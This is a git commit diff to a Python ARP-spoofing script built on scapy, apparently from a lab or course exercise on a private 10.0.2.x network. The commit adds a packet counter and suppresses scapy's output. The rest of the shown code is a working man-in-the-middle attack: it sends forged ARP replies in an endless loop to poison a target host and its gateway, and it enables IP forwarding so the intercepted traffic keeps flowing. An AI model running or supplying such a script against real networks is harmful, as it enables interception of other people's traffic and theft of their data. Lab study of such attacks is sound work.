5ed3f02af9c16e9e142585019f44e6f2792730bb
nicbatten <48190415+nicbatten@users.noreply.github.com>
2019-08-10 15:19:09 -0400

    Counting packets sent and incrementing them on output

--- arp_spoof.py
+++ arp_spoof.py
@@ -15,11 +15,14 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
+sent_packets_count = 0
 while True:
     spoof("10.0.2.4", "10.0.2.1")
     spoof("10.0.2.1", "10.0.2.4")
+    sent_packets_count = sent_packets_count + 2
+    print("[+] Packets sent:" + str (sent_packets_count))
     time.sleep(2)
